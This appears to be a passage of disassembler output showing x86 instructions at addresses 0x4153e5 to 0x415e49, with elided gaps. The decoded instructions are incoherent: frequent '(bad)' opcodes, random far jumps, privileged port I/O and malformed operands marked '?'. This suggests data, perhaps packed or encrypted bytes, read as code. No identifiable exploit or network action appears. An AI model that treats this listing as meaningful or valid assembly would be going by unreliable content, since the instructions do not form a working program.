  4153e5:	sbb    BYTE PTR ds:0x133f8648,0x16
  4153ec:	loope  0x415432
	...
  415456:	ins    DWORD PTR es:[edi],dx
  415457:	lock repz jmp FWORD PTR cs:[edi]
  41545c:	std    
  41545d:	repz mov edi,0xaad3e5b0
  415463:	(bad)
  415467:	in     eax,0x0
  415469:	add    BYTE PTR [eax],al
  41546b:	add    DWORD PTR [eax],eax
  41546d:	add    dh,bh
  41546f:	or     al,0x25
  415471:	or     bh,ah
  415473:	daa    
  415474:	dec    eax
  415475:	ret    
  415476:	or     eax,esp
  415478:	xor    cl,BYTE PTR [edx+0x6b1e0441]
  41547e:	jge    0x4154e4
  415480:	jge    0x41548b
  415482:	add    ch,BYTE PTR [edi+0x42]
  415485:	xlat   BYTE PTR ds:[ebx]
  415486:	mov    bl,0xa9
  415488:	out    0x15,eax
  41548a:	adc    eax,0x4c397a02
  41548f:	iret   
  415490:	add    eax,0xcd2cb603
  415495:	push   es
  415496:	cmp    DWORD PTR [edx+0x129cf09b],eax
  41549c:	gs icebp 
  41549e:	ins    BYTE PTR es:[edi],dx
  41549f:	push   ebp
  4154a0:	push   ebx
  4154a1:	mov    al,ds:0xded70550
  4154a6:	fwait
  4154a7:	leave  
  4154a8:	and    esi,edi
  4154aa:	fcom   DWORD PTR [ebp+0x4b]
  4154ad:	jns    0x41547f
  4154af:	push   cs
  4154b0:	int3   
  4154b1:	test   cl,dh
  4154b3:	std    
  4154b4:	jb     0x4154f6
  4154b6:	ret    0xeeaa
  4154b9:	mov    sp,0xdec5
  4154bd:	and    edi,DWORD PTR [ecx+0x36]
  4154c0:	sub    BYTE PTR [ebx+eax*4],bl
  4154c3:	pop    ebx
  4154c4:	ins    BYTE PTR es:[edi],dx
  4154c5:	in     eax,0x4d
  4154c7:	jo     0x4154d6
  4154c9:	mov    ebp,0xc692548a
  4154ce:	(bad)  
  4154cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154d0:	inc    edx
  4154d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154d2:	xor    al,BYTE PTR [ebp-0xf]
  4154d5:	push   es
  4154d6:	cmp    ebp,DWORD PTR [ebx]
  4154d8:	xor    eax,0x9e3ed86f
  4154dd:	push   ecx
  4154de:	mov    esp,0x9f17a65c
  4154e3:	out    dx,al
  4154e4:	in     eax,dx
  4154e5:	jg     0x415549
  4154e7:	or     edx,DWORD PTR [edi-0x3dabd30f]
  4154ed:	xchg   edx,eax
  4154ee:	leave  
  4154ef:	adc    dh,BYTE PTR [edi-0x53c6902]
  4154f5:	ret    
  4154f6:	sub    cl,BYTE PTR [ebp+0x12ff3a65]
  4154fc:	mov    BYTE PTR [ebx+0x1c],0x18
  415500:	pop    esp
  415501:	push   edi
  415502:	scas   al,BYTE PTR es:[edi]
  415503:	leave  
  415504:	test   DWORD PTR [edx],esi
  415506:	loope  0x4154f1
  415508:	sti    
  415509:	dec    esp
  41550a:	dec    edx
  41550b:	dec    ebp
  41550c:	lock cmp al,0xba
  41550f:	loope  0x41554a
  415511:	repnz add eax,0xcc376506
  415517:	aaa    
  415518:	cld    
  415519:	test   DWORD PTR [ecx-0x28],esp
  41551c:	(bad)  
  41551d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41551e:	int    0x95
  415520:	adc    edi,DWORD PTR [eax+edi*2+0x5890f910]
  415527:	xor    DWORD PTR [edi],ecx
  415529:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41552a:	popa   
  41552b:	inc    edx
  41552c:	stc    
  41552d:	outs   dx,BYTE PTR ds:[esi]
  41552e:	pop    eax
  41552f:	or     al,0x71
  415531:	xor    esp,esp
  415533:	out    dx,al
  415534:	dec    edx
  415535:	push   edi
  415536:	xchg   esi,eax
  415537:	sub    al,0x22
  415539:	adc    DWORD PTR [ebx+0x74f2f0d8],0x73
  415540:	dec    ebp
  415541:	test   DWORD PTR [eax],0x1a1d7f3
  415547:	pop    ss
  415548:	out    dx,al
  415549:	xor    BYTE PTR [esi],ch
  41554b:	sar    DWORD PTR [ecx-0x27f600b8],cl
  415551:	int    0x3d
  415553:	push   ss
  415554:	test   BYTE PTR [eax-0x5df97c01],0xdd
  41555b:	in     al,0x38
  41555d:	mov    eax,0x9a64c7d8
  415562:	jmp    0x415538
  415564:	jae    0x4155d1
  415566:	in     eax,0x2d
  415568:	lods   eax,DWORD PTR ds:[esi]
  415569:	pop    ds
  41556a:	ja     0x4155eb
  41556c:	(bad)  
  41556d:	out    0x0,eax
	...
  4155d3:	add    BYTE PTR [eax],al
  4155d5:	add    ah,ah
  4155d7:	lock sub DWORD PTR [edx],ecx
  4155da:	cmp    eax,0xa2fee7db
  4155df:	arpl   WORD PTR [ebx],bp
  4155e1:	je     0x4155f7
  4155e3:	nop
  4155e4:	cmp    ch,bh
  4155e6:	addr16 out 0x0,al
  4155e9:	add    BYTE PTR [eax],al
  4155eb:	add    DWORD PTR [eax],eax
  4155ed:	add    BYTE PTR ds:0xeca422bb,bl
  4155f3:	and    edi,DWORD PTR [esi+ecx*8-0x5f]
  4155f7:	outs   dx,BYTE PTR ds:[esi]
  4155f8:	cmp    BYTE PTR [ebx-0x2e],ah
  4155fb:	cmp    al,0x7a
  4155fd:	fadd   st,st(0)
  4155ff:	pop    eax
  415600:	aas    
  415601:	ret    0x8c23
  415604:	(bad)  
  415606:	aaa    
  415607:	nop
  415608:	pop    ecx
  415609:	loopne 0x41560a
  41560b:	push   ebx
  41560c:	in     al,0x9a
  41560e:	adc    BYTE PTR [ecx+0x0],dl
  415611:	pop    DWORD PTR [edx]
  415613:	cdq    
  415614:	fnsave [edx+0x6c9277d8]
  41561a:	xlat   BYTE PTR ds:[ebx]
  41561b:	xchg   esp,eax
  41561c:	mov    esi,0xf4f720e6
  415621:	je     0x415699
  415623:	mov    cl,0x1a
  415625:	inc    edi
  415627:	fisub  WORD PTR [edx-0x3]
  41562a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41562b:	imul   esp,ecx,0xf07694af
  415631:	push   esp
  415632:	xor    eax,0x70bd5712
  415637:	int    0xf2
  415639:	gs mov esp,0x95764d36
  41563f:	mov    ecx,0x1d2d2c4c
  415644:	rcl    BYTE PTR [eax+edx*8+0x1e],cl
  415648:	lds    ebx,FWORD PTR [ecx]
  41564a:	inc    cl
  41564c:	lock arpl WORD PTR [ebx+0x5f5aa32c],bp
  415653:	add    edi,esp
  415655:	jmp    0xfc8e0456
  41565a:	aam    0xf9
  41565c:	dec    ecx
  41565d:	pop    esp
  41565e:	dec    esp
  41565f:	push   ebp
  415660:	repnz cmp BYTE PTR [ebx-0x3bab8f8a],al
  415667:	jp     0x4155f8
  415669:	outs   dx,DWORD PTR ds:[esi]
  41566a:	lds    esp,FWORD PTR [eax]
  41566c:	cmp    al,0xcb
  41566e:	mov    al,ds:0xb8d362d3
  415673:	(bad)  
  415674:	mov    bl,0x7c
  415676:	pop    ebx
  415677:	sbb    esp,ebx
  415679:	fcmovu st,st(7)
  41567b:	push   ss
  41567c:	sahf   
  41567d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41567e:	adc    ah,BYTE PTR [ebx+0x28a09bcb]
  415684:	pop    esi
  415685:	mov    edx,0xde0bae05
  41568a:	outs   dx,DWORD PTR ds:[esi]
  41568b:	rcl    BYTE PTR [ebx+0x7ffecaca],1
  415691:	xor    esi,esi
  415693:	push   edx
  415694:	or     al,0xa1
  415696:	loop   0x415679
  415698:	pop    esp
  415699:	enter  0x501b,0x37
  41569d:	call   0xc6d4cfba
  4156a2:	loop   0x41570b
  4156a4:	stos   DWORD PTR es:[edi],eax
  4156a5:	pop    edi
  4156a6:	(bad)  
  4156a7:	xchg   edi,eax
  4156a8:	mov    ch,0x98
  4156aa:	rcl    DWORD PTR ds:0x874432bb,cl
  4156b0:	or     esi,DWORD PTR [ebx+eax*2-0x76]
  4156b4:	pop    edi
  4156b5:	add    al,0x9f
  4156b7:	xor    BYTE PTR [edi],ah
  4156b9:	ins    BYTE PTR es:[edi],dx
  4156ba:	adc    cl,bh
  4156bc:	rdmsr  
  4156be:	dec    edx
  4156bf:	fmul   DWORD PTR [eax]
  4156c1:	ret    0x6763
  4156c4:	inc    ecx
  4156c5:	pop    ebp
  4156c6:	push   cs
  4156c7:	lahf   
  4156c8:	sbb    BYTE PTR [ebp-0x58b55fa0],bh
  4156ce:	cdq    
  4156cf:	push   esp
  4156d0:	gs push esp
  4156d2:	mov    dl,0x0
  4156d4:	(bad)  
  4156d5:	mov    edx,0x4380c263
  4156da:	bound  ecx,QWORD PTR [esi+eiz*2-0x43c84729]
  4156e1:	std    
  4156e2:	xor    BYTE PTR [edx+0x24],al
  4156e5:	xor    BYTE PTR [ebx],al
  4156e7:	jge    0x41566c
  4156e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156ea:	dec    esi
  4156eb:	(bad)  
  4156ec:	cmp    edi,edx
	...
  415756:	ins    DWORD PTR es:[edi],dx
  415757:	call   0xbafd:0x67ff45bc
  41575e:	mov    bl,0xba
  415760:	inc    esi
  415761:	sub    al,0xa8
  415763:	fs add eax,0xe76789
  415769:	add    BYTE PTR [eax],al
  41576b:	add    DWORD PTR [eax],eax
  41576d:	add    BYTE PTR [ebx-0x5beaf41f],cl
  415773:	into   
  415774:	or     cl,bh
  415776:	fst    QWORD PTR [edx]
  415778:	jne    0x41576d
  41577a:	lods   eax,DWORD PTR ds:[esi]
  41577b:	fld    QWORD PTR [eax-0x47]
  41577e:	addr16 mov bl,0xd7
  415781:	ret    
  415782:	pushf  
  415783:	mov    esp,0xba386e2a
  415788:	or     ch,BYTE PTR [esi+0x20]
  41578b:	dec    esi
  41578c:	std    
  41578d:	mov    ds:0x63ac5ed1,al
  415792:	les    edx,FWORD PTR [ebx+0x4a]
  415795:	neg    BYTE PTR [ebx-0x1e]
  415798:	mov    ah,BYTE PTR [ecx+0x48]
  41579b:	into   
  41579c:	sub    ebx,eax
  41579e:	sbb    eax,0xeaf17d28
  4157a3:	ja     0x4157a5
  4157a5:	sbb    DWORD PTR [ebp-0x23],ecx
  4157a8:	pop    esi
  4157a9:	or     eax,0x4c29f253
  4157ae:	xor    ecx,DWORD PTR [edx+0x74b14238]
  4157b4:	cwde   
  4157b5:	imul   edx,ebp,0x3882627d
  4157bb:	fild   WORD PTR [edi]
  4157bd:	out    0xe3,al
  4157bf:	xchg   ecx,eax
  4157c0:	iret   
  4157c1:	arpl   WORD PTR [edi+0x1f403ad0],sp
  4157c7:	cmp    edi,edi
  4157c9:	sub    eax,DWORD PTR [eax-0x49]
  4157cc:	jne    0x415821
  4157ce:	pop    eax
  4157cf:	mov    al,0xa0
  4157d1:	xchg   esi,eax
  4157d2:	adc    ch,BYTE PTR [ebx+0x4720e666]
  4157d8:	sub    DWORD PTR [ebx],0x3e0aca5c
  4157de:	dec    edi
  4157df:	repnz mov ecx,0x82adb2c8
  4157e5:	idiv   DWORD PTR [ebp-0x7b]
  4157e8:	pop    ebx
  4157e9:	aad    0xd8
  4157eb:	inc    eax
  4157ec:	in     eax,dx
  4157ed:	add    eax,0x90fbc705
  4157f2:	or     DWORD PTR [esi+0x6ba9d8c0],ecx
  4157f8:	mov    al,BYTE PTR [esi]
  4157fa:	or     eax,0x1b4859c0
  4157ff:	loopne 0x41580a
  415801:	dec    ecx
  415802:	inc    ebp
  415803:	pop    ebp
  415804:	push   cs
  415805:	mov    eax,ds:0x9e8ec3aa
  41580a:	mov    al,ds:0x2096a427
  41580f:	and    dl,ch
  415811:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415812:	push   ds
  415813:	inc    ecx
  415814:	cli    
  415815:	jmp    0x8caa:0xb9cf3f29
  41581c:	das    
  41581d:	adc    ebx,edx
  41581f:	and    eax,0xf0f58ef6
  415824:	xchg   ebp,eax
  415825:	gs pop eax
  415827:	pushf  
  415828:	cmp    ah,BYTE PTR [esi+0x24d7cc32]
  41582e:	sub    eax,0x3586f7ca
  415833:	fist   DWORD PTR [ecx]
  415835:	sbb    BYTE PTR [edi-0x57cb5184],cl
  41583b:	push   0xffffffca
  41583d:	ja     0x4158a9
  41583f:	mov    eax,ds:0x92a17fc9
  415844:	aas    
  415845:	mov    dl,0xd8
  415847:	inc    edi
  415848:	lahf   
  415849:	jge    0x4157d2
  41584b:	mov    ecx,0x35e0dc23
  415850:	push   edx
  415851:	mov    esi,0x9c7b248b
  415856:	mul    BYTE PTR [edx-0x42]
  415859:	dec    ebx
  41585a:	(bad)  
  41585b:	mov    al,0xcf
  41585d:	nop
  41585e:	retf   
  41585f:	push   0x4324527b
  415864:	test   BYTE PTR [eax-0x5a],al
  415867:	fs jb  0x415892
  41586a:	push   ebx
  41586b:	add    cl,BYTE PTR [ebp+0x87]
	...
  4158d5:	add    bl,cl
  4158d7:	(bad)  
  4158d8:	xchg   ebx,eax
  4158d9:	in     al,dx
  4158da:	mov    bh,0xed
  4158dc:	(bad)  
  4158dd:	inc    DWORD PTR [edi]
  4158df:	(bad)  
  4158e1:	rcr    DWORD PTR [edx-0x35],cl
  4158e4:	adc    BYTE PTR [ebx+0x67],0xe8
  4158e8:	add    BYTE PTR [eax],al
  4158ea:	add    BYTE PTR [ecx],al
  4158ec:	add    BYTE PTR [eax],al
  4158ee:	jle    0x415882
  4158f0:	dec    DWORD PTR [ebx]
  4158f2:	pop    edx
  4158f3:	mov    cl,BYTE PTR ss:[edx+0x1c73fd5f]
  4158fa:	adc    bh,BYTE PTR [ebp+0x5282e9af]
  415900:	add    BYTE PTR [esi+0x68],bh
  415903:	push   edi
  415904:	xchg   BYTE PTR [edi+0x222b663a],ah
  41590a:	mov    dl,0xf7
  41590c:	push   edi
  41590d:	mov    DWORD PTR [eax-0x3d],eax
  415910:	mov    bl,0xc2
  415912:	sbb    ch,BYTE PTR [edi]
  415914:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415915:	mov    ecx,0x8f788896
  41591a:	ret    0x7a29
  41591d:	mov    ebx,0x19317a69
  415922:	sti    
  415923:	inc    esp
  415924:	add    DWORD PTR [ebx],ebp
  415926:	fsubp  st(3),st
  415928:	mov    DWORD PTR [ecx-0x1d5d99e9],esp
  41592e:	mov    ebp,esi
  415930:	dec    edx
  415931:	dec    BYTE PTR [ebx+0x4ead0722]
  415937:	jmp    0x7995d354
  41593c:	lods   eax,DWORD PTR ds:[esi]
  41593d:	sub    ebx,ecx
  41593f:	xchg   ebx,eax
  415940:	stos   BYTE PTR es:[edi],al
  415941:	xchg   ebp,eax
  415942:	rcr    DWORD PTR [ecx*1-0x320c845c],0x11
  41594a:	test   esp,ebp
  41594c:	pop    eax
  41594d:	aad    0x0
  41594f:	xchg   esp,eax
  415950:	lods   al,BYTE PTR ds:[esi]
  415951:	xor    dl,dl
  415953:	push   0x2212b0c2
  415958:	mov    WORD PTR [ebp-0x12],?
  41595b:	xor    al,0x27
  41595d:	mov    ebp,0x6d3abca2
  415962:	sti    
  415963:	test   BYTE PTR [esi+0x78],dl
  415966:	mov    al,0x93
  415968:	mov    cl,0xda
  41596a:	pop    ecx
  41596b:	mov    edx,0x11ab58c5
  415970:	das    
  415971:	dec    eax
  415972:	out    dx,al
  415973:	xchg   esp,eax
  415974:	(bad)  
  415975:	ss dec ebx
  415977:	mov    ?,WORD PTR [esp+ebp*4+0x45fdd946]
  41597e:	stos   BYTE PTR es:[edi],al
  41597f:	fst    DWORD PTR [edx+ebp*8+0x25e51bc0]
  415986:	push   eax
  415987:	xor    ah,al
  415989:	or     DWORD PTR [ecx],0xffffff86
  41598c:	sub    BYTE PTR [ecx+0x283e62d3],ch
  415992:	scas   al,BYTE PTR es:[edi]
  415993:	mov    WORD PTR [edi-0x78],cs
  415996:	inc    edx
  415997:	out    dx,eax
  415998:	sub    eax,0xd7a13116
  41599d:	leave  
  41599e:	xchg   ebx,eax
  41599f:	addr16 ret 0xb9c3
  4159a3:	xor    DWORD PTR [edi+eiz*8],ebp
  4159a6:	rol    DWORD PTR [ebx-0x76],cl
  4159a9:	pslld  mm2,mm3
  4159ac:	into   
  4159ad:	jle    0x415984
  4159af:	loopne 0x415a0a
  4159b1:	adc    ebp,DWORD PTR [ebx-0x3c6e5de]
  4159b7:	cmp    al,0x13
  4159b9:	fist   DWORD PTR [edx*1-0x76ac71f2]
  4159c0:	xlat   BYTE PTR ds:[ebx]
  4159c1:	xor    bh,0xb0
  4159c4:	test   al,0x47
  4159c6:	cmp    dl,dl
  4159c8:	jae    0x415970
  4159ca:	pusha  
  4159cb:	push   ds
  4159cc:	cmp    al,0xbd
  4159ce:	or     al,0xdd
  4159d0:	dec    edx
  4159d1:	(bad)  
  4159d2:	dec    edx
  4159d3:	inc    eax
  4159d4:	(bad)  
  4159d6:	add    al,0x87
  4159d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159d9:	push   cs
  4159da:	mov    ecx,0x6389c9a3
  4159df:	pop    eax
  4159e0:	dec    ecx
  4159e1:	mov    eax,0xafbc1e05
  4159e6:	inc    edx
  4159e7:	dec    eax
  4159e8:	push   cs
  4159e9:	imul   edx,edi,0x80ad53
	...
  415a53:	add    BYTE PTR [eax],al
  415a55:	add    BYTE PTR [ebp-0x78],al
  415a58:	sub    al,0x77
  415a5a:	in     eax,dx
  415a5b:	neg    DWORD PTR [edi-0x46]
  415a5e:	sub    edi,DWORD PTR [edi-0x10]
  415a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a62:	pop    es
  415a63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a64:	cmp    BYTE PTR [esi+0xe967],dl
  415a6a:	add    BYTE PTR [ecx],al
  415a6c:	add    BYTE PTR [eax],al
  415a6e:	or     bl,BYTE PTR [eax-0x3f]
  415a71:	adc    esi,DWORD PTR [esi]
  415a73:	std    
  415a74:	enter  0xb180,0xa6
  415a78:	dec    edi
  415a79:	stos   DWORD PTR es:[edi],eax
  415a7a:	xchg   edi,eax
  415a7b:	cmc    
  415a7c:	push   edx
  415a7d:	push   ebx
  415a7e:	xchg   ecx,eax
  415a7f:	jg     0x415a1f
  415a81:	out    dx,al
  415a82:	mov    cl,0x6c
  415a84:	scas   eax,DWORD PTR es:[edi]
  415a85:	pusha  
  415a86:	push   esp
  415a87:	push   cs
  415a88:	fcom   DWORD PTR [ecx]
  415a8a:	or     al,0x78
  415a8d:	rcr    DWORD PTR [esi],1
  415a8f:	lds    eax,FWORD PTR [ebp+0x6831759b]
  415a95:	imul   edx,ecx,0xcff879dc
  415a9b:	dec    eax
  415a9c:	jns    0x415ac4
  415a9e:	mov    eax,ds:0xb308512a
  415aa3:	pop    edi
  415aa4:	or     BYTE PTR ds:0xf477c3c1,al
  415aaa:	jg     0x415b2b
  415aac:	adc    dh,BYTE PTR [eax]
  415aae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415aaf:	shr    BYTE PTR [eax-0x4e],0x14
  415ab3:	pop    ds
  415ab4:	mov    bh,0xc2
  415ab6:	bswap  edi
  415ab8:	pop    ebp
  415ab9:	push   ecx
  415aba:	loop   0x415b10
  415abc:	div    DWORD PTR [eax]
  415abe:	pop    es
  415abf:	lods   al,BYTE PTR ds:[esi]
  415ac0:	mov    ah,dh
  415ac2:	imul   ebx,DWORD PTR [esp+esi*2-0x7b],0x5a74e4e4
  415aca:	test   al,0xd7
  415acc:	sbb    edi,DWORD PTR [eax-0x16432fc0]
  415ad2:	out    0xb2,al
  415ad4:	or     eax,esi
  415ad6:	aam    0xbd
  415ad8:	popf   
  415ad9:	stos   DWORD PTR es:[edi],eax
  415ada:	sub    BYTE PTR [eax+0x5a867e4e],bh
  415ae0:	loopne 0x415ac0
  415ae2:	sbb    al,0x1b
  415ae4:	pop    es
  415ae5:	addr16 mov ebp,0x3410506f
  415aeb:	out    dx,al
  415aec:	cwde   
  415aed:	lods   eax,DWORD PTR ds:[esi]
  415aee:	(bad)  
  415aef:	out    0x6c,al
  415af1:	pop    ebp
  415af2:	in     eax,0x87
  415af4:	call   0x84c2:0x13e10889
  415afb:	fs sub eax,0xdb4a23b2
  415b01:	inc    esi
  415b02:	(bad)  
  415b03:	xor    edi,ebx
  415b05:	sub    eax,esi
  415b07:	popa   
  415b08:	and    DWORD PTR [edx+0x39],0x22
  415b0c:	cmp    eax,0x9e9c4507
  415b11:	mov    cl,0x78
  415b13:	ja     0x415aa3
  415b15:	dec    edx
  415b16:	mov    cl,0x1e
  415b18:	inc    edi
  415b19:	or     bl,ch
  415b1b:	push   edi
  415b1c:	xchg   esi,eax
  415b1d:	or     eax,esp
  415b1f:	xor    al,0x12
  415b21:	mov    al,0x1b
  415b23:	dec    eax
  415b24:	add    bh,BYTE PTR [edx-0x3d]
  415b27:	jb     0x415b14
  415b29:	adc    ebx,edi
  415b2b:	or     al,BYTE PTR [eax+0x4a815f6a]
  415b31:	ret    
  415b32:	fbld   TBYTE PTR [edx+ecx*8-0x582df44b]
  415b39:	ins    BYTE PTR es:[edi],dx
  415b3a:	fidiv  DWORD PTR [esi+ebx*1+0x54]
  415b3e:	and    al,0xc3
  415b40:	jno    0x415ae3
  415b42:	mov    eax,DWORD PTR [eax]
  415b44:	into   
  415b45:	addr16 mov bl,0xbe
  415b48:	mov    ecx,0x4383cc93
  415b4d:	and    eax,0x2d0a3216
  415b52:	leave  
  415b53:	inc    eax
  415b54:	call   0xaf95:0x60442240
  415b5b:	aaa    
  415b5c:	pop    edi
  415b5d:	bound  edi,QWORD PTR [ebx+0x2ff9ef41]
  415b63:	push   ecx
  415b64:	pusha  
  415b65:	sbb    eax,0x5645cf56
  415b6a:	cmc    
  415b6b:	scas   eax,DWORD PTR es:[edi]
  415b6c:	js     0x415b7a
	...
  415bd6:	fistp  QWORD PTR [esi-0x449a6dfb]
  415bdc:	(bad)  
  415bde:	stc    
  415bdf:	dec    ebp
  415be0:	push   ss
  415be1:	(bad)  
  415be3:	std    
  415be4:	mov    BYTE PTR [ebx+0x67],al
  415be7:	jmp    0x0:0x1000000
  415bee:	cdq    
  415bef:	mov    esi,0x8498daf6
  415bf4:	jo     0x415bc3
  415bf6:	or     al,0x7e
  415bf8:	xchg   BYTE PTR [ebx-0x1c4c1aae],bh
  415bfe:	xor    al,0x8f
  415c00:	cdq    
  415c01:	mov    ch,0x12
  415c03:	std    
  415c04:	push   cs
  415c05:	bnd jno 0x415bfb
  415c08:	aam    0x61
  415c0a:	fwait
  415c0b:	pop    esp
  415c0c:	xchg   ecx,eax
  415c0d:	outs   dx,DWORD PTR ds:[esi]
  415c0e:	loopne 0x415bfa
  415c10:	bound  ebx,QWORD PTR ds:0x912f85ac
  415c16:	ret    0x2019
  415c19:	dec    esp
  415c1a:	stc    
  415c1b:	test   DWORD PTR ds:0x8294d70f,0x3094614c
  415c25:	jmp    0x26b2:0x351751b3
  415c2c:	pop    ds
  415c2d:	push   ebp
  415c2e:	daa    
  415c2f:	inc    ecx
  415c30:	xchg   edx,eax
  415c31:	adc    BYTE PTR [ebp+0x2a],dh
  415c34:	xor    DWORD PTR [ecx],0xaab85c0
  415c3a:	xchg   BYTE PTR [ebp-0x4e2d6b20],bh
  415c40:	jl     0x415c13
  415c42:	push   ebx
  415c43:	lods   al,BYTE PTR ds:[esi]
  415c44:	test   DWORD PTR [esi+0x625e622c],ecx
  415c4a:	xchg   ecx,eax
  415c4b:	add    al,0x64
  415c4d:	add    esi,DWORD PTR [ecx+ebp*4-0x408bd1cf]
  415c54:	clc    
  415c55:	lds    edi,FWORD PTR [ecx+esi*4-0x4f]
  415c59:	jnp    0x415cb8
  415c5b:	repnz stc 
  415c5d:	sub    al,0xd
  415c5f:	hlt    
  415c60:	dec    eax
  415c61:	sub    al,0x5d
  415c63:	stos   BYTE PTR es:[edi],al
  415c64:	xor    cl,bh
  415c66:	(bad)  
  415c68:	push   eax
  415c69:	xor    DWORD PTR [edi+0x27a49a06],edx
  415c6f:	ret    
  415c70:	icebp  
  415c71:	add    al,0x0
  415c73:	sub    al,0x2c
  415c75:	aas    
  415c76:	bound  eax,QWORD PTR [ebp+ebx*2-0x2e7def03]
  415c7d:	dec    edx
  415c7e:	xchg   ebp,eax
  415c7f:	inc    esp
  415c80:	mov    ch,0xe3
  415c82:	cmp    esp,DWORD PTR fs:0x71646768
  415c89:	into   
  415c8a:	xor    eax,0xfd017325
  415c8f:	push   eax
  415c90:	or     ebx,0x806c1c87
  415c96:	cs repz cmp ch,0x0
  415c9b:	jmp    0x4b26be76
  415ca0:	dec    eax
  415ca1:	shr    DWORD PTR [ebx+0x75],cl
  415ca4:	sbb    bh,cl
  415ca6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ca7:	jae    0x415cb7
  415ca9:	scas   eax,DWORD PTR es:[edi]
  415caa:	dec    edi
  415cab:	mov    ah,0x2d
  415cad:	and    al,0xdf
  415caf:	mul    BYTE PTR fs:[eax+0x2825314d]
  415cb6:	int3   
  415cb7:	fnstenv [ebx+0x63]
  415cba:	jge    0x415d0e
  415cbc:	daa    
  415cbd:	sub    al,0x4c
  415cbf:	mov    eax,0xb8589232
  415cc4:	sbb    al,ah
  415cc6:	xlat   BYTE PTR ds:[ebx]
  415cc7:	leave  
  415cc8:	mov    edi,0xbe3c5471
  415ccd:	mov    dh,0x2d
  415ccf:	sbb    dl,cl
  415cd1:	push   esp
  415cd2:	ror    BYTE PTR [ebx],cl
  415cd4:	loopne 0x415cda
  415cd6:	dec    esi
  415cd7:	push   eax
  415cd8:	shl    DWORD PTR [edx],cl
  415cda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cdb:	pop    esi
  415cdc:	gs pop ebx
  415cde:	adc    BYTE PTR [ebx],dl
  415ce0:	dec    edx
  415ce1:	popf   
  415ce2:	and    dh,dh
  415ce4:	rol    DWORD PTR [eax-0x45],0xa9
  415ce8:	stc    
  415ce9:	pop    edx
  415cea:	mov    ebp,0x9c677d
	...
  415d53:	add    BYTE PTR [eax],al
  415d55:	add    BYTE PTR [edx],bh
  415d57:	adc    BYTE PTR [edi-0x444040c4],bh
  415d5d:	push   ss
  415d5e:	push   esp
  415d5f:	push   ecx
  415d60:	mov    esi,0x4f9de91f
  415d65:	popa   
  415d66:	addr16 jmp 0x415d69
  415d69:	add    BYTE PTR [eax],al
  415d6b:	add    DWORD PTR [eax],eax
  415d6d:	add    BYTE PTR [eax],bl
  415d6f:	cmp    ebx,DWORD PTR [edi-0x43]
  415d72:	pop    eax
  415d73:	xor    ebx,DWORD PTR [edx-0x1aa44c30]
  415d79:	(bad)  
  415d7a:	repnz pop es
  415d7c:	xor    eax,0xc9aea2e6
  415d81:	pusha  
  415d82:	xor    BYTE PTR [eax],0x48
  415d85:	shl    DWORD PTR [eax+ecx*8-0x25],1
  415d89:	sbb    bh,al
  415d8b:	mov    al,0xb1
  415d8d:	ror    BYTE PTR [esi-0x10041438],cl
  415d93:	pop    es
  415d94:	push   es
  415d95:	and    esp,DWORD PTR [edi]
  415d97:	test   eax,0x171dea96
  415d9c:	dec    ebp
  415d9d:	adc    ebp,DWORD PTR [edi]
  415d9f:	(bad)  
  415da0:	adc    DWORD PTR [edi-0x18],ecx
  415da3:	outs   dx,DWORD PTR ds:[esi]
  415da4:	pop    eax
  415da5:	inc    edx
  415da6:	fwait
  415da7:	int    0x4
  415da9:	sbb    eax,0xc83de422
  415dae:	ror    DWORD PTR [eax-0x4d0e9e45],0x2
  415db5:	dec    eax
  415db6:	aam    0xfd
  415db8:	jne    0x415d68
  415dba:	cmp    ch,al
  415dbc:	rcl    BYTE PTR [esi-0x2439aa61],0xc2
  415dc3:	xor    dh,dl
  415dc5:	arpl   ax,dx
  415dc7:	jmp    0xa22d:0x2ba3dd46
  415dce:	clc    
  415dcf:	sahf   
  415dd0:	daa    
  415dd1:	icebp  
  415dd2:	imul   BYTE PTR [esi]
  415dd4:	int    0x3c
  415dd6:	enter  0xab37,0x22
  415dda:	out    dx,eax
  415ddb:	fdivr  DWORD PTR [eax+eiz*2-0x315c45f1]
  415de2:	xchg   ebx,eax
  415de3:	into   
  415de4:	sub    DWORD PTR [esi-0x4c],eax
  415de7:	aas    
  415de8:	addr16 jmp edx
  415deb:	in     eax,0xf8
  415ded:	clc    
  415dee:	enter  0xc538,0x30
  415df2:	frstor [edx+0x0]
  415df5:	fcmovb st,st(5)
  415df7:	pop    edi
  415df8:	jecxz  0x415d9f
  415dfa:	test   al,0xbc
  415dfc:	fld    DWORD PTR [edi+0x3cefbe40]
  415e02:	mov    cl,0xa9
  415e04:	scas   al,BYTE PTR es:[edi]
  415e05:	push   edi
  415e06:	cmp    ecx,edx
  415e08:	js     0x415ddf
  415e0a:	pop    ebx
  415e0b:	inc    edi
  415e0c:	int3   
  415e0d:	jge    0x415e33
  415e0f:	inc    eax
  415e10:	retf   
  415e11:	push   ebx
  415e12:	pop    ebp
  415e13:	retf   0xdbce
  415e16:	(bad)  [edi-0x41dd2a65]
  415e1c:	xchg   esp,eax
  415e1d:	cmp    DWORD PTR [edx-0x47d3051c],edx
  415e23:	inc    eax
  415e24:	cmp    edi,0x5e
  415e27:	push   ss
  415e28:	iret   
  415e29:	stos   BYTE PTR es:[edi],al
  415e2a:	int3   
  415e2b:	jge    0x415ddb
  415e2d:	outs   dx,DWORD PTR ds:[esi]
  415e2e:	out    0x41,eax
  415e30:	push   ebp
  415e31:	mov    ds:0xe953fe30,al
  415e36:	mov    edx,0xc181b0a4
  415e3b:	cld    
  415e3c:	pop    eax
  415e3d:	and    esp,DWORD PTR ds:0x891f0959
  415e43:	mov    WORD PTR [ecx-0x6b31c2fc],cs
  415e49:	cmp    al,0x4c
